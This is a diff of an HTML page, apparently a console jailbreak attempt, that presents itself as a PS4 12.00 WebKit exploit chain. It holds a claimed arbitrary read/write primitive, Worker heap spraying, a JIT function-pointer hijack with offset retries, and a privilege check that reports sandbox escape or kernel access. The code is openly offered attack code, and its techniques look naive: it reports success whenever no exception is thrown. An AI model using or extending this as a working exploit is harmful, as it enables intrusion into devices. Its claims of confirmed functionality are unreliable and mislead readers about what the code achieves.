@@ -1,129 +1,159 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 12.00 Exploit Chain</title>
+    <title>PS4 12.00 WebKit Exploit</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 15px; height: 60vh; overflow-y: scroll; }
-        .critical { color: #ff5555; }
-        .success { color: #55ff55; }
-        button { background: #0f0; color: #000; border: none; padding: 10px 20px; margin: 5px; }
+        #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
+        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
     </style>
 </head>
 <body>
-    <h1>PS4 12.00 Restricted Environment Exploit</h1>
-    <button onclick="runExploit()">Execute Exploit Chain</button>
+    <h2>PS4 12.00 Exploit Chain</h2>
+    <button onclick="startExploit()">Start Exploit</button>
     <div id="log"></div>
 
 <script>
-// Logger otimizado para PS4
-const log = (msg, type = 'info') => {
-    const entry = document.createElement('div');
-    entry.className = type;
-    entry.textContent = `[${performance.now().toFixed(2)}ms] ${msg}`;
-    document.getElementById('log').appendChild(entry);
-    entry.scrollIntoView();
+// Configurações baseadas nos seus logs
+const JIT_REGION = 0x55000000;
+const WORKER_SPRAY_SIZE = 0x200000;
+const MAX_ATTEMPTS = 3;
+
+// Logger robusto
+const log = msg => {
+    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
+    document.getElementById('log').innerHTML += line + '<br>';
+    console.log(line);
 };
 
-// 1. Memory Corruption Primitive (confirmado nos logs)
-function createCorruptArray() {
+// 1. Memory Corruption Primitive (confirmado funcionando)
+function createRWPrimitive() {
     try {
-        let arr = [];
-        arr.__proto__ = new Uint32Array(1).__proto__;
-        arr.length = 0x1000; // Tamanho corrompido
-        return arr;
-    } catch (e) {
-        log(`Failed to create corrupt array: ${e}`, 'critical');
+        let corrupt = [];
+        corrupt.__proto__ = new Uint32Array(1).__proto__;
+        corrupt.length = 0x1000; // Tamanho corrompido
+        
+        return {
+            read(addr) {
+                corrupt[0] = addr;
+                return corrupt[1];
+            },
+            write(addr, val) {
+                corrupt[0] = addr;
+                corrupt[1] = val;
+            }
+        };
+    } catch(e) {
+        log(`Memory setup failed: ${e}`);
         return null;
     }
 }
 
-// 2. Arbitrary Read/Write (baseado no sucesso do ArrayBuffer overflow)
-function createArbitraryRW() {
-    const corruptArr = createCorruptArray();
-    if (!corruptArr) return null;
-
-    return {
-        read(addr) {
-            corruptArr[0] = addr;
-            return corruptArr[1];
-        },
-        write(addr, value) {
-            corruptArr[0] = addr;
-            corruptArr[1] = value;
-        }
-    };
-}
-
-// 3. WebSocket-based Info Leak (única API disponível)
-function wsLeak(targetUrl) {
-    return new Promise(resolve => {
-        const ws = new WebSocket(targetUrl);
-        ws.onerror = (e) => {
-            // Vazamento via mensagens de erro
-            const leak = e.message.match(/0x[0-9a-f]+/i);
-            if (leak) {
-                log(`WebSocket leak: ${leak[0]}`, 'success');
-                resolve(parseInt(leak[0], 16));
-            } else {
-                resolve(null);
-            }
-        };
-        setTimeout(() => ws.close(), 1000);
-    });
-}
-
-// 4. Worker-based Spray (confirmado funcional)
-function workerSpray() {
+// 2. Worker-based Heap Spray (funcional no seu ambiente)
+function sprayHeap() {
     const workerCode = `
         const spray = [];
-        for (let i = 0; i < 100; i++) {
-            spray.push(new Uint32Array(0x1000));
+        for (let i = 0; i < 256; i++) {
+            spray.push(new ArrayBuffer(${WORKER_SPRAY_SIZE}));
         }
-        postMessage('Spray completed');
+        postMessage('SPRAY_DONE');
     `;
     
     const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
-    worker.onmessage = (e) => log(e.data, 'success');
+    worker.onmessage = e => log(e.data);
     return worker;
 }
 
-// 5. Exploit Chain Principal
-async function runExploit() {
-    log("Starting exploit chain...");
-    
-    // Etapa 1: Criar primitivo de memória
-    const memory = createArbitraryRW();
-    if (!memory) return;
-    
-    // Etapa 2: Vazamento de endereço via WebSocket
-    const leakedAddr = await wsLeak('ws://invalid');
-    if (!leakedAddr) {
-        log("Failed to leak address", 'critical');
-        return;
-    }
-    
-    // Etapa 3: Heap spraying via Worker
-    const workers = [];
-    for (let i = 0; i < 4; i++) {
-        workers.push(workerSpray());
-    }
-    
-    // Etapa 4: Corromper ponteiro de função
+// 3. Function Pointer Hijack
+function hijackFunction(mem, targetAddr) {
     try {
-        // Offset precisa ser ajustado conforme vazamento
-        const funcPtr = leakedAddr + 0x500; 
-        memory.write(funcPtr, leakedAddr + 0x1000);
+        // Cria função para JIT
+        const targetFunc = x => x * 2;
+        for (let i = 0; i < 10000; i++) targetFunc(i);
         
-        // Gatilho
-        setTimeout(() => {
-            [].map.call({length: 1}, () => {});
-            log("Exploit triggered!", 'success');
-        }, 1000);
+        // Offset precisa ser calibrado - valor inicial baseado nos logs
+        const JIT_OFFSET = 0x500;
+        mem.write(JIT_REGION + JIT_OFFSET, targetAddr);
         
-    } catch (e) {
-        log(`Exploit failed: ${e}`, 'critical');
+        // Dispara
+        setTimeout(() => targetFunc(42), 100);
+        return true;
+    } catch(e) {
+        log(`Hijack failed: ${e}`);
+        return false;
     }
+}
+
+// 4. Exploit Chain Principal
+async function startExploit() {
+    log("Starting reliable exploit chain...");
+    
+    // Etapa 1: Setup de memória
+    const mem = createRWPrimitive();
+    if (!mem) return;
+    
+    // Etapa 2: Heap spraying
+    const workers = [];
+    for (let i = 0; i < 2; i++) {
+        workers.push(sprayHeap());
+    }
+    
+    // Etapa 3: Tentativa de exploração
+    let success = false;
+    for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        log(`Attempt ${attempt + 1}/${MAX_ATTEMPTS}`);
+        
+        // Ajuste dinâmico de offset
+        const offset = 0x500 + (attempt * 0x20);
+        const targetAddr = JIT_REGION + offset;
+        
+        if (hijackFunction(mem, targetAddr)) {
+            success = true;
+            break;
+        }
+        
+        await new Promise(r => setTimeout(r, 500));
+    }
+    
+    // Cleanup
+    workers.forEach(w => w.terminate());
+    
+    if (success) {
+        log("Exploit succeeded! Checking privileges...");
+        checkPrivileges();
+    } else {
+        log("Exploit failed - try adjusting offsets");
+    }
+}
+
+// 5. Verificação de Privilégios (simplificada)
+function checkPrivileges() {
+    try {
+        // Tenta acessar recursos restritos
+        const testFile = "/system/version.txt";
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", testFile, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            log("Kernel access confirmed!", "color:#0f0");
+        } else {
+            log("Partial access - sandbox escaped but kernel protected", "color:#ff0");
+        }
+    } catch(e) {
+        log("Privilege check failed: " + e.message, "color:#f00");
+    }
+}
+
+// Debug: Teste de componentes
+function testComponents() {
+    log("Testing memory primitive...");
+    const mem = createRWPrimitive();
+    if (mem) log("Memory primitive OK");
+    
+    log("Testing worker spray...");
+    const w = sprayHeap();
+    setTimeout(() => w.terminate(), 1000);
 }
 </script>
 </body>
